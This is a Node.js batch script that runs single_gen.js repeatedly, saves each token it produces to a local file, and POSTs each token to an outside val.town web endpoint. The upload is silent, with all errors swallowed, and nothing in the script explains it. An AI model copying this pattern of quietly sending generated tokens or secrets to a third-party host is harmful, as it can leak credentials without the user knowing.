const { spawn } = require('child_process');
const fs = require('fs');

const log = (...args) => console.error('[MULTI]', ...args);

function runSingleGeneration(iteration, totalRuns) {
    return new Promise((resolve) => {
        log(`[${iteration}/${totalRuns}] Starting...`);

        const child = spawn('node', ['single_gen.js'], {
            env: { ...process.env },
            stdio: ['ignore', 'pipe', 'pipe'],
            cwd: process.cwd()
        });

        let stdout = '';

        child.stdout.on('data', (data) => {
            stdout += data.toString();
        });

        child.stderr.on('data', (data) => {
            process.stderr.write(data.toString());
        });

        const timeout = setTimeout(() => {
            log(`[${iteration}] Timeout`);
            child.kill('SIGKILL');
        }, 180000);

        child.on('close', (code) => {
            clearTimeout(timeout);

            if (code === 0) {
                const lines = stdout.trim().split('\n').filter(l => l.trim());
                const token = lines[lines.length - 1];
                if (token && token.length > 30 && !token.includes(' ') && !token.includes('[')) {
                    log(`[${iteration}] SUCCESS`);
                    resolve(token);
                } else {
                    log(`[${iteration}] No valid token`);
                    resolve(null);
                }
            } else {
                log(`[${iteration}] Failed (code ${code})`);
                resolve(null);
            }
        });

        child.on('error', (err) => {
            clearTimeout(timeout);
            log(`[${iteration}] Error:`, err.message);
            resolve(null);
        });
    });
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

(async () => {
    const runs = parseInt(process.env.NUM_RUNS) || 5;
    log(`Starting ${runs} runs...`);

    if (!fs.existsSync('tokens')) {
        fs.mkdirSync('tokens', { recursive: true });
    }

    const tokens = [];

    for (let i = 1; i <= runs; i++) {
        const token = await runSingleGeneration(i, runs);

        if (token) {
            tokens.push(token);
            fs.appendFileSync('tokens/all_tokens.txt', token + '\n');
            console.log(token);

            try {
                const https = require('https');
                const data = JSON.stringify({ token, batch_index: i });
                const req = https.request({
                    hostname: 'gigachadtrey--a1b5c282cb3711f0857d42dde27851f2.web.val.run',
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
                });
                req.write(data);
                req.end();
            } catch (e) {}
        }

        if (i < runs) {
            log(`Waiting 3s...`);
            await sleep(3000);
        }
    }

    log('==========================================');
    log(`DONE: ${tokens.length}/${runs} tokens`);
    log('==========================================');

    if (tokens.length === 0) process.exit(1);
})();
